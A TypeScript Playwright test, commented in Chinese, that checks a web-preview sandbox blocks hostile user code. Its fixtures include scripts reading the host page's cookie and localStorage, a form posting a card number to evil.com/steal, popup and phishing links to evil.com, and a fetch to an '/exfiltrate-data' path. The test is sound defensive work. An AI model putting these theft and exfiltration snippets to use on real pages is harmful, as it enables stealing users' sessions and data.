import assert from 'node:assert/strict'
import http from 'node:http'
import { chromium, type Browser } from 'playwright'
import { buildWebPreviewDocument } from '../src/utils/webPreviewDocument'

console.log('=== [Playwright 真实浏览器] 验证沙箱隔离与安全档位 ===')

// 1. 启动轻量本地真实 HTTP 宿主服务器，提供真实的同源/跨源网络宿主环境
const hostPort = 39871
const server = http.createServer((req, res) => {
    res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Set-Cookie': 'host_secret_cookie=SUPER_SENSITIVE_SESSION_TOKEN_12345; Path=/; SameSite=Lax',
    })
    res.end(`<!DOCTYPE html>
<html>
<head><title>Host Page</title></head>
<body>
  <h1>宿主信任域测试主页</h1>
  <div id="preview-mount"></div>
</body>
</html>`)
})

await new Promise<void>((resolve) => server.listen(hostPort, '127.0.0.1', () => resolve()))
console.log(`[Host] 测试宿主服务已启动于 http://127.0.0.1:${hostPort}`)

let browser: Browser | null = null
try {
    try {
        browser = await chromium.launch({ channel: 'msedge', headless: true })
    } catch {
        browser = await chromium.launch({ headless: true })
    }
} catch (launchError) {
    server.close()
    console.error('❌ 无法启动真实浏览器进行沙箱集成验证，测试依赖缺失:', launchError)
    process.exit(1)
}

try {
    const context = await browser.newContext()
    const page = await context.newPage()

    // 访问宿主页面并预置敏感凭据与存储
    await page.goto(`http://127.0.0.1:${hostPort}`)
    await page.evaluate(() => {
        localStorage.setItem('host_storage_token', 'SECRET_LOCAL_STORAGE_CREDENTIAL_ABC')
        sessionStorage.setItem('host_session_token', 'SECRET_SESSION_STORAGE_CREDENTIAL_XYZ')
    })

    console.log('\n--- 1. 验证默认安全静态模式 (sandbox="", allowScripts=false) ---')
    const staticUserCode = `<!DOCTYPE html>
<html>
<body>
  <h1 id="heading">Static Title</h1>
  <script>window.staticScriptExecuted = true;</script>
  <button id="static-btn" onclick="window.staticHandlerExecuted = true;">按钮</button>
  <a id="ext-link" href="https://evil.com/phish" target="_blank">外部链接</a>
</body>
</html>`

    const staticCompiledDoc = buildWebPreviewDocument(staticUserCode, {
        allowScripts: false,
    })

    // 在真实宿主页面挂载 static iframe
    await page.evaluate((doc) => {
        const mount = document.getElementById('preview-mount')!
        mount.innerHTML = ''
        const iframe = document.createElement('iframe')
        iframe.id = 'sandbox-static-frame'
        iframe.sandbox = ''
        iframe.srcdoc = doc
        mount.appendChild(iframe)
    }, staticCompiledDoc)

    await page.waitForTimeout(300)
    const staticFrameLocator = page.frameLocator('#sandbox-static-frame')
    const headingText = await staticFrameLocator.locator('#heading').innerText()
    assert.strictEqual(headingText, 'Static Title', '静态模式下正常展示 HTML 文本')

    // 断言 1：宿主域尝试直接访问沙箱 iframe 属性时，被浏览器原生 SecurityError 阻断（来源隔离生效）
    const hostAccessBlocked = await page.evaluate(() => {
        try {
            const frame = (document.getElementById('sandbox-static-frame') as HTMLIFrameElement).contentWindow
            void frame?.location.href
            return 'unblocked'
        } catch (e: any) {
            return e.name
        }
    })
    assert.strictEqual(hostAccessBlocked, 'SecurityError', '宿主由于跨源沙箱隔离，无法直接读取 iframe 内部私有属性')

    // 断言 2：静态模式下内联 onclick 属性必须被剥离且不可执行
    await staticFrameLocator.locator('#static-btn').click()
    const staticFrameObj = page.frames().find(f => f !== page.mainFrame())!
    const staticScriptRan = await staticFrameObj.evaluate(() => (window as any).staticScriptExecuted)
    const staticHandlerRan = await staticFrameObj.evaluate(() => (window as any).staticHandlerExecuted)
    assert.strictEqual(staticScriptRan, undefined, '静态模式下 <script> 绝不能执行')
    assert.strictEqual(staticHandlerRan, undefined, '静态模式下内联 onclick 属性必须被剥离且不可执行')

    console.log('✅ 静态模式验证通过：HTML 正常渲染，宿主隔离生效，脚本与内联事件完全禁止！')

    console.log('\n--- 2. 验证受限沙箱交互模式 (sandbox="allow-scripts", 无 allow-same-origin) ---')
    const interactiveUserCode = `<!DOCTYPE html>
<html>
<body>
  <div id="interactive-marker">Interactive Loaded</div>
  <form id="steal-form" action="https://evil.com/steal" method="POST">
    <input name="credit_card" value="1234-5678">
    <button id="submit-btn" type="submit">Submit</button>
  </form>
  <script>
    window.interactiveScriptRan = true;

    // 攻击尝试 1：跨域/沙箱逃逸窃取宿主 Cookie
    try {
      window.stolenCookie = window.parent.document.cookie;
    } catch (e) {
      window.stolenCookieError = e.name;
    }

    // 攻击尝试 2：窃取宿主 localStorage
    try {
      window.stolenStorage = window.parent.localStorage.getItem('host_storage_token');
    } catch (e) {
      window.stolenStorageError = e.name;
    }

    // 攻击尝试 3：弹窗逃逸
    try {
      window.openResult = window.open('https://evil.com/popup');
    } catch (e) {
      window.openResult = 'thrown';
    }
  </script>
</body>
</html>`

    const interactiveCompiledDoc = buildWebPreviewDocument(interactiveUserCode, {
        allowScripts: true,
        previewId: 'browser-test-interactive',
        injectConsoleBridge: true,
    })

    // 在真实宿主页面挂载 interactive iframe
    await page.evaluate((doc) => {
        const mount = document.getElementById('preview-mount')!
        mount.innerHTML = ''
        const iframe = document.createElement('iframe')
        iframe.id = 'sandbox-interactive-frame'
        iframe.sandbox = 'allow-scripts' // 严禁设置 allow-same-origin
        iframe.srcdoc = doc
        mount.appendChild(iframe)
    }, interactiveCompiledDoc)

    await page.waitForTimeout(400)
    const interactiveFrameLocator = page.frameLocator('#sandbox-interactive-frame')
    const markerText = await interactiveFrameLocator.locator('#interactive-marker').innerText()
    assert.strictEqual(markerText, 'Interactive Loaded', '交互沙箱正常加载')

    // 断言 3：交互模式下内联脚本可以正常执行，但宿主凭据完全隔离
    const evalResults = await page.evaluate(() => {
        const frameEl = document.getElementById('sandbox-interactive-frame') as HTMLIFrameElement
        return {
            sandboxAttr: frameEl.getAttribute('sandbox') || '',
        }
    })
    assert.ok(evalResults.sandboxAttr.includes('allow-scripts'), 'iframe 包含 allow-scripts')
    assert.ok(!evalResults.sandboxAttr.includes('allow-same-origin'), 'iframe 绝对严禁包含 allow-same-origin')

    // 在沙箱 iframe 内部执行断言
    const interactiveFrameObj = page.frames().find(f => f !== page.mainFrame())!
    const attackResults = await interactiveFrameObj.evaluate(() => {
        const win = window as any
        return {
            interactiveScriptRan: win.interactiveScriptRan,
            stolenCookie: win.stolenCookie,
            stolenCookieError: win.stolenCookieError,
            stolenStorage: win.stolenStorage,
            stolenStorageError: win.stolenStorageError,
            openResult: win.openResult,
        }
    })

    assert.strictEqual(attackResults.interactiveScriptRan, true, '交互模式脚本已正常运行')
    assert.strictEqual(attackResults.stolenCookie, undefined, '沙箱脚本绝不能直接读取宿主 Cookie')
    assert.strictEqual(attackResults.stolenCookieError, 'SecurityError', '尝试访问宿主 document.cookie 必须被浏览器抛出 SecurityError 阻断')
    assert.strictEqual(attackResults.stolenStorage, undefined, '沙箱脚本绝不能直接读取宿主 localStorage')
    assert.strictEqual(attackResults.stolenStorageError, 'SecurityError', '尝试访问宿主 localStorage 必须被浏览器抛出 SecurityError 阻断')
    assert.strictEqual(attackResults.openResult, null, 'window.open 调用必须被拦截并返回 null')

    console.log('✅ 宿主隔离验证通过：宿主 Cookie 与 Storage 访问被浏览器 SecurityError 彻底阻断，window.open 逃逸被拦截！')

    console.log('\n--- 3. 验证 CSP 网络外联阻断与表单拦截 ---')
    // 断言 4：在沙箱内发起外部网络请求 (fetch)，确认被 CSP connect-src 'none' 强力拦截
    const fetchBlocked = await interactiveFrameObj.evaluate(async () => {
        try {
            await fetch('http://127.0.0.1:39871/exfiltrate-data')
            return false // 未被拦截
        } catch {
            return true // 被 CSP 或网络策略成功拦截
        }
    })
    assert.strictEqual(fetchBlocked, true, 'iframe 内部主动向外发起 fetch 请求必须被 CSP connect-src none 严格阻断')

    // 断言 5：表单提交被全局拦截防护
    const formSubmitBlocked = await interactiveFrameObj.evaluate(() => {
        const form = document.getElementById('steal-form') as HTMLFormElement
        const event = new Event('submit', { bubbles: true, cancelable: true })
        const notCancelled = form.dispatchEvent(event)
        return !notCancelled // true 表示已经被 preventDefault 拦截
    })
    assert.strictEqual(formSubmitBlocked, true, '表单提交必须在捕获阶段被拦截 (defaultPrevented === true)')

    console.log('✅ 策略阻断验证通过：CSP 成功阻断 fetch 外联，表单提交被完全拦截！')

} finally {
    if (browser) await browser.close()
    server.close()
}

console.log('\n========================================')
console.log('🎉 Playwright 真实浏览器沙箱与安全隔离验证全部通过！')
console.log('========================================')
